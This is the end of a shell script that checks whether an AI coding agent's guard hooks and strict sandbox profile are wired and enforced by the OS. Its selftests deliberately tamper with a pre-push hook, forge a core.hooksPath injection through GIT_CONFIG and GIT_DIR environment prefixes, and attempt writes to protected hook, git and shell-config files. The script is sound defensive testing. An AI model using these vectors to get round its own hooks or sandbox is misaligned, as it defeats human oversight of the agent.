  # LINKED WORKTREE in tracked mode — the fan-out surface (the kit's own engineer seats build there),
  # and the face BOTH pre-existing linked-worktree branches got wrong for this mode: the REV H1
  # "relative hooksPath resolves to nothing here" premise is FALSE (a linked checkout HAS its own
  # hooks/), and the Δ6 freshness-N/A rationale ("the compare sides live in different checkouts") is
  # false too — both sides live in THIS checkout. So the clean case must PASS and the dirty case must
  # RED, never N/A.
  d="$base/rung_tracked_wt_main"; mk_tracked "$d"
  wt="$base/rung_tracked_wt_linked"
  if git -C "$d" worktree add -q "$wt" -b rung-tracked-wt >/dev/null 2>&1; then
    if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$wt" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'tracked-hooks mode'; then
      echo "selftest PASS: linked worktree in tracked-hooks mode (clean) -> wired, mode named"
    else echo "selftest FAIL: linked worktree in tracked-hooks mode should PASS (rc=$rc): $out"; st=1; fi
    printf '#!/bin/sh\n# KIT_GUARD_CORE\necho tampered\n' > "$wt/hooks/pre-push"; chmod +x "$wt/hooks/pre-push"
    if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$wt" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'MODIFIED in the working tree'; then
      echo "selftest PASS: linked worktree in tracked-hooks mode + dirty hook -> FAIL (no freshness N/A)"
    else echo "selftest FAIL: linked worktree dirty hook should FAIL, not N/A (rc=$rc): $out"; st=1; fi
  else
    echo "selftest FAIL: could not construct the linked-worktree tracked-hooks fixture"; st=1
  fi

  # --separate-git-dir MAIN worktree (review round 1, item 3, SEC M2): git-dir == git-common-dir
  # even though `.git` is a FILE, not a directory — must take the FULL ladder incl. freshness, not
  # be misread as "linked" the way the old `[ -d "$dir/.git" ]` test would have.
  d="$base/rung_sepgitdir"; mkdir -p "$d/hooks" "$d/.claude/hooks"
  mk "$d" "$MATCHER"
  : > "$d/ENGINEERING-PRINCIPLES.md"
  printf '#!/bin/sh\n# KIT_GUARD_CORE\necho installed\n' > "$d/hooks/pre-push"
  printf '#!/bin/sh\nexit 0\n' > "$d/.claude/hooks/guard-core.sh"
  sepdir="$base/rung_sepgitdir.git"
  git init -q --separate-git-dir="$sepdir" "$d" >/dev/null
  git -C "$d" add -A >/dev/null
  git -C "$d" -c user.name=b3-selftest -c user.email=b3-selftest@example.invalid commit -q -m init >/dev/null
  rh=$(git -C "$d" rev-parse --git-path hooks/pre-push) || rh=""
  case "$rh" in /*) : ;; *) rh="$d/$rh" ;; esac
  mkdir -p "$(dirname "$rh")"
  cp "$d/hooks/pre-push" "$rh"
  chmod +x "$rh"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'FRESH'; then
    echo "selftest PASS: --separate-git-dir MAIN worktree -> full ladder, FRESH (not misread as linked)"
  else echo "selftest FAIL: --separate-git-dir MAIN worktree should be FRESH via the full ladder (rc=$rc): $out"; st=1; fi

  # hostile-$dir refusal (review round 1, item 4a, SEC M1 + REV L1): a project directory PATH
  # itself carrying a control character (a literal TAB) is refused with a STATIC line — no path
  # interpolated — before the rung leg prints anything else about it.
  ctrl_seg=$(printf 'ctrlx\011dir')
  d="$base/$ctrl_seg"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  refusal_line=$(printf '%s\n' "$out" | grep 'refusing to evaluate' || true)
  if [ "$rc" -eq 1 ] && [ -n "$refusal_line" ] && ! printf '%s' "$refusal_line" | grep -qF "$ctrl_seg"; then
    echo "selftest PASS: hostile \$dir rung leg -> static refusal line, no path printed"
  else
    echo "selftest FAIL: hostile \$dir rung leg should statically refuse without printing the path (rc=$rc): $out"; st=1
  fi

  # --rung1-only (review round 1, item 10, SEC M3): on a HOOKLESS qualifying tree (no .git at all),
  # certifying only the PreToolUse legs must exit 0 — the second rung is not even evaluated.
  d="$base/rung_rung1only"; mk "$d" "$MATCHER"; : > "$d/ENGINEERING-PRINCIPLES.md"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" --rung1-only "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q -- '--rung1-only'; then
    echo "selftest PASS: --rung1-only on a hookless qualifying tree -> rc 0, second rung not evaluated"
  else echo "selftest FAIL: --rung1-only on a hookless qualifying tree should exit 0 (rc=$rc): $out"; st=1; fi

  # SANITIZER-UNSET-RESTORES-EXPORTED: the bash-as-/bin/sh lock on _gw_git (see the function's header
  # below; it is the twin of inception-done.sh's (b10) leg and of scripts/kit-update.sh's).
  selftest_sanitizer_bash_unset

  if [ "$st" -ne 0 ]; then echo "guard-wired --selftest: FAIL" >&2; return 1; fi
  echo "guard-wired --selftest: OK (sandbox: the off default wired with the Edit denies still required; the strict block, in settings.json, an adopter's settings.local.json (arrays concatenate, local scalars win) or the shipped template, FAILs on each required key/denyWrite entry removed; --sandbox-enforce SKIP/FAIL routes against the merged strict profile; full/wildcard wired; no-mcp/degenerate/Read-only/partial/missing fail; rung fresh/foreign wired, absent/stale/non-exec/dangling/core-missing/tracked-missing FAIL, HEAD-less tree FAILs naming the missing first commit (never 'recopy'), no-git/CI=1/unqualifying/hooksPath-genuine N/A, linked-worktree+relative-hooksPath and --separate-git-dir and GIT_DIR-reroute and hostile-\$dir all correctly resolved, --rung1-only skips rung 2; tracked-hooks mode wired clean (main + linked worktree) and RED when the worktree hook is MODIFIED, kit-source disarm RED (local + global scope) while the adopter D2 skip holds; fixtures left in $base)"
  return 0
}

# ── selftest_sanitizer_bash_unset : the BASH-AS-/bin/sh regression lock for _gw_git
# (SANITIZER-UNSET-RESTORES-EXPORTED). It extracts the SHIPPED sanitizer from this very file (so it
# grades the deployed text, not a copy) and runs it under `bash` with the hermetic lane's face-(a)
# triad EXPORTED and a forged `core.hooksPath` applied as a TEMPORARY PREFIX on a function call. In
# bash-as-/bin/sh, `unset` of a variable that carried a prefix assignment over an ALREADY-EXPORTED one
# RESTORES the exported value instead of removing it, so an `unset`-based sanitizer lets the forged
# GIT_CONFIG_KEY_0 through and the probe prints `hooks` — the exact vector this file's own header
# calls the SEC HIGH-1 class.
# ⚠️ Under `dash` this leg is TAUTOLOGICAL (dash's unset removes the variable outright); it is kept and
# run under `bash` EXPLICITLY because macOS /bin/sh IS bash 3.2 and CI's per-PR hermetic face runs
# these selftests under the face-(a) environment. HOME/XDG_CONFIG_HOME point at the throwaway dir
# because the sanitizer deliberately does NOT strip them (see _gw_git's header).
selftest_sanitizer_bash_unset() {
  if ! command -v bash >/dev/null 2>&1; then
    echo "selftest SKIP: sanitizer bash-as-sh leg (no bash on PATH — the regression it locks is bash-only)"
    return 0
  fi
  _sbu_d=$(mktemp -d) || { echo "selftest FAIL: sanitizer bash-as-sh leg — no tmpdir"; st=1; return 1; }
  git -C "$_sbu_d" init -q >/dev/null 2>&1 || true
  # Anchored on the OPENING (security L2; `/^_gw_git/` starts at any column-0 line with that prefix).
  # TWO VECTORS (review I-1): the config-injection triad AND the LOCATOR pair — GIT_DIR/GIT_WORK_TREE
  # at a DONOR repo whose own config carries core.hooksPath — each ambient-exported and re-applied as the temporary prefix that `unset` restores. Either leak prints a value; a clean run prints nothing.
  _sbu_src=$(awk '/^_gw_git\(\) \{/,/^}$/' "$0")
  _sbu_dn=$_sbu_d/donor; { git init -q "$_sbu_dn" && git -C "$_sbu_dn" config core.hooksPath DONOR; } >/dev/null 2>&1 || true
  # `|| true`: a sanitized `git config --get` of an ABSENT key exits 1 — which is the PASSING case
  # here — and this file runs under `set -e`, so the assignment must not be the script's last act.
  _sbu_out=$( cd "$_sbu_d" && HOME="$_sbu_d" XDG_CONFIG_HOME="$_sbu_d" \
      GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.useConfigOnly GIT_CONFIG_VALUE_0=true \
      GIT_DIR="$_sbu_dn/.git" GIT_WORK_TREE="$_sbu_dn" \
      bash -c "$_sbu_src
_sbu_probe() { _gw_git config --get core.hooksPath; }
GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=hooks _sbu_probe
GIT_DIR='$_sbu_dn/.git' GIT_WORK_TREE='$_sbu_dn' _sbu_probe" 2>&1 ) || true
  rm -rf "$_sbu_d" 2>/dev/null || true
  if [ -z "$_sbu_out" ]; then
    echo "selftest PASS: _gw_git neutralizes a forged prefix-over-exported GIT_CONFIG triad AND GIT_DIR/GIT_WORK_TREE locator pair (bash-as-/bin/sh; tautological under dash)"
    return 0
  fi
  echo "selftest FAIL: _gw_git let a forged core.hooksPath through under bash-as-/bin/sh -> [$_sbu_out]"
  st=1
  return 1
}

# ── --sandbox-enforce: does the OS enforce the SHIPPED sandbox policy? (design §7 legs 1, 2, 3, 7)
# Applies the shipped `sandbox.filesystem` through the pinned sandbox runtime Claude Code is built on,
# in a throwaway repo with a throwaway HOME (the real home is never touched), and judges by file HASHES,
# never by exit codes. A minimal test, not an escape catalogue: plain writes to the protected paths, a
# no-sandbox negative, liveness, and one whole-tree restore.
# Exit: 0 = enforced · 1 = a protected write got through (or the negative could not write) · 2 = jq absent
#       3 = SKIP (the runtime could not start here; never a pass).
SRT_PKG='@anthropic-ai/sandbox-runtime@0.0.78'

# _se_path <settings-path> <repo> <home> -> the absolute path the runtime needs.
_se_path() {
  case "$1" in
    ./*) printf '%s\n' "$2/${1#./}" ;;
    \~) printf '%s\n' "$3" ;;
    \~/*) _rest=${1#??}; printf '%s\n' "$3/$_rest" ;;
    *) printf '%s\n' "$1" ;;
  esac
}

# _se_list <settings> <jq-array-path> <repo> <home> -> a JSON array of translated absolute paths.
_se_list() {
  jq -r "$2[]?" "$1" | while IFS= read -r _p; do _se_path "$_p" "$3" "$4"; done | jq -R 'select(length>0)' | jq -s .
}

# _se_cfg <settings> <repo> <home> <out> [nodeny|notemp] -> the runtime settings file for the strict profile.
_se_cfg() {
  _aw=$(_se_list "$1" '.sandbox.filesystem.allowWrite' "$2" "$3")
  _aw=$(printf '%s' "$_aw" | jq --arg r "$2" '. + [$r]')
  if [ "${5:-}" = notemp ]; then _aw=$(printf '%s' "$_aw" | jq 'map(select(. != "/private/var/folders" and . != "/var/folders"))'); fi
  if [ "${5:-}" = nodeny ]; then _dw='[]'; else _dw=$(_se_list "$1" '.sandbox.filesystem.denyWrite' "$2" "$3"); fi
  jq -n --argjson aw "$_aw" --argjson dw "$_dw" \
    '{network:{allowedDomains:[],deniedDomains:[]},filesystem:{denyRead:[],allowWrite:$aw,denyWrite:$dw}}' > "$4"
}

# _se_sbx <cfg> <shell-command> : run the command under the pinned runtime, inside the throwaway repo.
_se_sbx() {
  ( cd "$_se_repo" && HOME="$_se_home" npm_config_cache="$_se_cache" \
      npx -y "$SRT_PKG" --settings "$1" -- sh -c "$2" ) >>"$_se_log" 2>&1 || true
}

_se_hash() { git hash-object "$1" 2>/dev/null || echo MISSING; }

# _se_git <git-args...> : git in the throwaway repo, reading neither the operator's global/system config nor
# its hooks (a global core.hooksPath or init template would otherwise leak into the seeding and the negatives).
_se_git() {
  HOME="$_se_home" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null \
    git -C "$_se_repo" -c user.name=gw-sandbox -c user.email=gw-sandbox@example.invalid "$@"
}

# _se_leg1 <cfg> <label> <expect: held|landed> -> 0 = every protected plain append behaved as expected,
# 1 = it did not, 3 = the runtime did not run a probe at all. Each probe also writes a sentinel under the
# allowed throwaway /tmp dir AFTER the protected write: a missing sentinel means the runtime errored (never
# counted as a refusal); a present sentinel with an unchanged hash means the write itself was refused.
_se_leg1() {
  _bad=0; _skip=0
  for _f in $_se_protected; do
    _h0=$(_se_hash "$_f"); rm -f "$_se_tmpw/ran"
    _se_sbx "$1" "echo '# x' >> '$_f'; echo ran > '$_se_tmpw/ran'"
    _h1=$(_se_hash "$_f")
    # Hash first: a landed write is a FAIL whatever the sentinel says. SKIP only when nothing changed AND
    # the sentinel is missing (the runtime never ran the probe).
    if [ "$_h0" = "$_h1" ] && [ ! -f "$_se_tmpw/ran" ]; then
      echo "SKIP: [$2] the runtime did not run the probe for ${_f#"$_se_base"/}: $(tail -n 1 "$_se_log" | cut -c1-160)"; _skip=1; continue
    fi
    if [ "$3" = held ]; then
      if [ "$_h0" = "$_h1" ]; then :; else echo "FAIL: [$2] a plain write to ${_f#"$_se_base"/} got through the sandbox (hash changed)"; _bad=1; fi
    else
      # The runtime also write-protects some paths on its own (.git/config, .git/hooks, .mcp.json), so only
      # the five the strict profile alone carries must land here.
      case "$_f" in
        */.claude/hooks/x|*/hooks/pre-push|*/.kit/dials.conf|"$_se_home"/.zshrc|"$_se_home"/.gitconfig)
          if [ "$_h0" != "$_h1" ]; then :; else echo "FAIL: [$2] the write to ${_f#"$_se_base"/} did not land with denyWrite emptied — leg 1 would prove nothing"; _bad=1; fi ;;
      esac
    fi
  done
  [ "$_bad" -eq 0 ] || return 1
  [ "$_skip" -eq 0 ] || return 3
  return 0
}

# _se_gap -> a leg ended in "the runtime never ran a probe": SKIP (3) only if nothing has failed yet; a
# recorded failure always wins (a SKIP must never hide a FAIL).
_se_gap() {
  [ "$rc" -eq 0 ] && return 3
  echo "guard-wired --sandbox-enforce: FAIL" >&2
  return 1
}

# _se_leg7 <cfg> -> a whole-tree restore under the sandbox leaves hooks/pre-push unchanged, and (only when it
# did) the same restore with no sandbox changes it. Sets rc (shared with sandbox_enforce) on a failure.
_se_leg7() {
  _hh=$(_se_hash "$_se_repo/hooks/pre-push"); _l7=0
  _se_sbx "$1" "git checkout $_se_rev1 -- ."
  if [ "$_hh" = "$(_se_hash "$_se_repo/hooks/pre-push")" ]; then echo "PASS: [leg 7] a whole-tree restore leaves hooks/pre-push unchanged"; else echo "FAIL: [leg 7] a whole-tree restore rewrote hooks/pre-push under the sandbox"; rc=1; _l7=1; fi
  # The negative is only meaningful when leg 7 held (a rewritten file leaves the restore nothing to change).
  if [ "$_l7" -ne 0 ]; then echo "NOTE: [leg 7 negative] not evaluated, leg 7 already failed"; return 0; fi
  _se_git checkout "$_se_rev1" -- . >/dev/null 2>&1 || true
  if [ "$_hh" != "$(_se_hash "$_se_repo/hooks/pre-push")" ]; then echo "PASS: [leg 7 negative] the same restore with no sandbox changes hooks/pre-push"; else echo "FAIL: [leg 7 negative] the restore changed nothing with no sandbox — the leg proves nothing"; rc=1; fi
}

# _se_seed -> builds the throwaway repo (two revisions, hooks/pre-push differing) and home. 3 = SKIP.
_se_seed() {
  mkdir -p "$_se_repo/.claude/hooks" "$_se_repo/hooks" "$_se_repo/.kit" "$_se_home" "$_se_cache" "$_se_tmpw"
  : > "$_se_log"
  HOME="$_se_home" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null git init -q "$_se_repo" >/dev/null 2>&1 || { echo "SKIP: git init failed"; return 3; }
  echo 'x' > "$_se_repo/.claude/hooks/x"; echo 'v1' > "$_se_repo/hooks/pre-push"; echo 'x' > "$_se_repo/.kit/dials.conf"
  mkdir -p "$_se_repo/.git/hooks"; echo 'x' > "$_se_repo/.git/hooks/x"
  echo '{}' > "$_se_repo/.mcp.json"; echo 'x' > "$_se_repo/free.txt"
  echo 'x' > "$_se_home/.zshrc"; echo 'x' > "$_se_home/.gitconfig"
  if ! { _se_git add -A >/dev/null 2>&1 && _se_git commit -q -m v1 >/dev/null 2>&1; }; then echo "SKIP: could not seed the throwaway repo"; return 3; fi
  echo 'v2' > "$_se_repo/hooks/pre-push"
  _se_git commit -q -am v2 >/dev/null 2>&1 || { echo "SKIP: could not seed the second revision"; return 3; }
  _se_rev1=$(_se_git rev-parse HEAD~1)
  _se_protected="$_se_repo/.claude/hooks/x $_se_repo/hooks/pre-push $_se_repo/.kit/dials.conf $_se_repo/.git/hooks/x $_se_repo/.git/config $_se_repo/.mcp.json $_se_home/.zshrc $_se_home/.gitconfig"
}

# _se_temp <cfg> <label> -> sets _se_mk to the directory a bare mktemp -d made under the policy ("" = refused)
# and _se_ran to 1 when the runtime ran the probe at all (the sentinel is written after the mktemp attempt).
_se_temp() {
  rm -f "$_se_tmpw/mk" "$_se_tmpw/ran"
  _se_sbx "$1" "d=\$(mktemp -d) && echo \"\$d\" > '$_se_tmpw/mk' && rmdir \"\$d\"; echo ran > '$_se_tmpw/ran'"
  _se_ran=0; [ -f "$_se_tmpw/ran" ] && _se_ran=1
  _se_mk=""; [ -s "$_se_tmpw/mk" ] && _se_mk=$(cat "$_se_tmpw/mk")
  return 0
}

# _se_leg_temp -> the macOS temp-root leg: a bare mktemp -d succeeds under the strict profile, and is refused
# with the two temp-root entries removed (else the leg proves nothing). N/A on Linux. Sets rc; returns 3 when
# the runtime never ran a probe.
_se_leg_temp() {
  [ "$(uname -s)" = Darwin ] || { echo "N/A: [temp root] macOS only (Linux mktemp honours TMPDIR and has no per-user temp root)"; return 0; }
  _tr=$(getconf DARWIN_USER_TEMP_DIR 2>/dev/null | sed 's:/*$::')
  [ -n "$_tr" ] || { echo "SKIP: [temp root] getconf DARWIN_USER_TEMP_DIR is empty"; return 3; }
  _se_temp "$_se_c" shipped
  [ "$_se_ran" -eq 1 ] || { echo "SKIP: [temp root] the runtime did not run the probe: $(tail -n 1 "$_se_log" | cut -c1-160)"; return 3; }
  case "$_se_mk" in
    "$_tr"/*) echo "PASS: [temp root] a bare mktemp -d succeeds under the strict profile" ;;
    *) echo "FAIL: [temp root] a bare mktemp -d was refused under the strict profile (allowWrite lacks the macOS temp root)"; rc=1; return 0 ;;
  esac
  _se_cfg "$_se_settings" "$_se_repo" "$_se_home" "$_se_base/notemp.json" notemp
  _se_temp "$_se_base/notemp.json" notemp
  if [ "$_se_ran" -eq 1 ] && [ -z "$_se_mk" ]; then
    echo "PASS: [temp root negative] with the two entries removed the same mktemp -d is refused, so the leg is graded"
  else
    echo "FAIL: [temp root negative] mktemp -d still succeeded with the temp root removed — the temp-root leg proves nothing"; rc=1
  fi
  return 0
}

sandbox_enforce() {
  # The OS proof runs against the STRICT profile (the shipped default has the sandbox off): the shipped
  # settings.json merged with the template an adopter copies to settings.local.json, by the documented rule
  # (scalars local over project, filesystem arrays concatenated). That is the kit's mirror, not a run of Claude Code.
  _se_settings="$1/.claude/settings.json"; _se_tmpl="$1/$SANDBOX_STRICT_TEMPLATE"
  command -v jq >/dev/null 2>&1 || { echo "UNVERIFIED: jq absent — cannot translate the strict sandbox policy; install jq" >&2; return 2; }
  [ -f "$_se_settings" ] || { echo "FAIL: $_se_settings missing — no shipped settings to merge the strict profile into"; return 1; }
  [ -f "$_se_tmpl" ] || { echo "FAIL: $_se_tmpl missing — no strict sandbox profile to enforce"; return 1; }
  _se_eff=$(_gw_merge_json "$_se_settings" "$_se_tmpl" 2>/dev/null) || { echo "FAIL: could not merge $_se_settings with $_se_tmpl (invalid JSON?) — no strict profile to enforce"; return 1; }
  printf '%s\n' "$_se_eff" | jq -e '.sandbox.enabled == true' >/dev/null 2>&1 || { echo "FAIL: the strict profile (settings.json merged with $SANDBOX_STRICT_TEMPLATE) does not enable the sandbox"; return 1; }
  command -v npx >/dev/null 2>&1 || { echo "SKIP: npx not found — the pinned sandbox runtime cannot be fetched"; return 3; }
  _se_base=$(mktemp -d /tmp/gw-sbx.XXXXXX) || { echo "SKIP: could not create a throwaway directory"; return 3; }
  _se_base=$( cd "$_se_base" && pwd -P )
  trap 'rm -rf "$_se_base"' EXIT HUP INT TERM
  printf '%s\n' "$_se_eff" > "$_se_base/effective.json"; _se_settings="$_se_base/effective.json"
  _se_repo="$_se_base/repo"; _se_home="$_se_base/home"; _se_cache="$_se_base/npm"; _se_log="$_se_base/runtime.log"
  _se_tmpw="$_se_base/tmpw"
  _se_seed || return $?
  _se_c="$_se_base/policy.json"; _se_cfg "$_se_settings" "$_se_repo" "$_se_home" "$_se_c"

  # Liveness first: a failure here is the runtime not starting (SKIP), never a pass and never a FAIL.
  _h0=$(_se_hash "$_se_repo/free.txt"); _se_sbx "$_se_c" "echo live >> '$_se_repo/free.txt'"
  if [ "$_h0" = "$(_se_hash "$_se_repo/free.txt")" ]; then
    echo "SKIP: the sandbox runtime could not run an ordinary write here (no network to fetch $SRT_PKG, bubblewrap/socat missing, or user namespaces blocked): $(tail -n 1 "$_se_log" | cut -c1-160)"
    return 3
  fi
  echo "PASS: [liveness] an ordinary write in the tree succeeds under the sandbox"
  rc=0
  # Leg 3 (liveness): a write under the throwaway /tmp dir, and a commit.
  _se_sbx "$_se_c" "echo live > '$_se_tmpw/w.txt'"
  if [ -s "$_se_tmpw/w.txt" ]; then echo "PASS: [liveness] a write under the throwaway /tmp dir succeeds"; else echo "FAIL: [liveness] a write under the throwaway /tmp dir was refused"; rc=1; fi
  _hd=$(_se_git rev-parse HEAD)
  _se_sbx "$_se_c" "git -c user.name=gw -c user.email=gw@example.invalid commit -q --allow-empty -m probe"
  if [ "$_hd" != "$(_se_git rev-parse HEAD)" ]; then echo "PASS: [liveness] a git commit succeeds under the sandbox"; else echo "FAIL: [liveness] a git commit was refused under the sandbox"; rc=1; fi
  # Leg 1: plain writes to every protected path are refused, hashes unchanged (a runtime error is a SKIP).
  _l1=0; _se_leg1 "$_se_c" sandbox held || _l1=$?
  [ "$_l1" -ne 3 ] || { _se_gap; return $?; }
  if [ "$_l1" -eq 0 ]; then echo "PASS: [leg 1] a plain write to each protected path is refused; every hash unchanged"; else rc=1; fi
  _se_leg7 "$_se_c"
  _lt=0; _se_leg_temp || _lt=$?
  [ "$_lt" -ne 3 ] || { _se_gap; return $?; }
  # Leg 2: the same plain writes with no sandbox DO change every protected file (the test can write).
  _bad=0
  for _f in $_se_protected; do
    _h0=$(_se_hash "$_f"); echo '# x' >> "$_f" 2>/dev/null || true
    [ "$_h0" != "$(_se_hash "$_f")" ] || { echo "FAIL: [leg 2] a plain write with no sandbox did not change ${_f#"$_se_base"/}"; _bad=1; }
  done
  if [ "$_bad" -eq 0 ]; then echo "PASS: [leg 2] the same plain writes with no sandbox change every protected file"; else rc=1; fi
  # Non-vacuity of the translation: with denyWrite emptied, the same plain writes DO land under the runtime.
  _se_cfg "$_se_settings" "$_se_repo" "$_se_home" "$_se_base/broken.json" nodeny
  _l1=0; _se_leg1 "$_se_base/broken.json" broken landed || _l1=$?
  [ "$_l1" -ne 3 ] || { _se_gap; return $?; }
  if [ "$_l1" -eq 0 ]; then echo "PASS: [non-vacuity] with denyWrite emptied the plain writes land, so leg 1 is graded"; else rc=1; fi
  [ "$rc" -eq 0 ] && echo "guard-wired --sandbox-enforce: OK (the strict profile, settings.json merged with the template, is enforced by the OS for the protected paths)"
  [ "$rc" -eq 0 ] || echo "guard-wired --sandbox-enforce: FAIL" >&2
  return "$rc"
}

mode=full
proj_dir="."
enforce=0
while [ $# -gt 0 ]; do
  case "$1" in
    --selftest) selftest; exit $? ;;
    --rung1-only) mode=rung1only ;;
    --sandbox-enforce) enforce=1 ;;
    *) proj_dir="$1" ;;
  esac
  shift
done
if [ "$enforce" -eq 1 ]; then sandbox_enforce "$proj_dir"; exit $?; fi
check_dir "$proj_dir" "$mode"
exit $?
